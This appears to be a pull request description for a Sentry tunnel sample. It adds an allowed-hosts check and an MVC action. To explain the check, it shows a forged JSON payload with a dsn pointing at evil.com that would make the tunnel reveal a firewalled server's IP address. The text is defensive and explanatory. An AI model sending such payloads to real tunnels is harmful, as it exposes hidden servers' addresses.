Add allowed Hosts to the sample; add MVC sample
To avoid forged attacks, a list of allowed hosts are required, otherwise it's possible to reveal the host server's IP address by forging a payload such as:
```json
{
    "dsn": "http://evil.com/whats-your-server-ip"
}
```
and sending it to the tunnel. This is undesirable when a service is hosted behind a firewall such as CloudFlare which shields the hostname but not directly the IP address.

Also added an MVC action to the sample, albeit possibly not the right place. I've tried to use ModelBinding instead of Request shenanigans, but apparently MVC cannot bind a model to `Dictionary<string, object>` and Sentry JS doesn't send the correct ContentType header in the first place for it.